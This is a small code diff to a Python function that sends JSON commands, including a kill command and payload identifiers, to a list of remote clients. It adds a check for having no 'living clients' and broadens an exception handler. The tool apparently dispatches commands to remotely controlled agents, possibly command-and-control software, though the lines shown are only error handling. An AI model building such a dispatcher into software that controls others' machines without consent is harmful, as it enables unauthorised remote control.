@@ -16,6 +16,9 @@ def send_command(
 
     headers = {"Content-type": "application/json"}
     clients, payload_info = get_command_arguments(target, payload_id)
+    if not clients:
+        logging.info("No living clients! That's just sad...")
+        return
     for identifier, external_ip, port in clients:
 
         if type == CommandType.KILL:
@@ -49,7 +52,7 @@ def send_command(
                 logging.info(
                     "Failed to send command. Status code: %s", response.status_code
                 )
-        except requests.exceptions.RequestException as e:
+        except Exception as e:
             logging.error("Exception raised while sending command: %s", str(e))
 
 
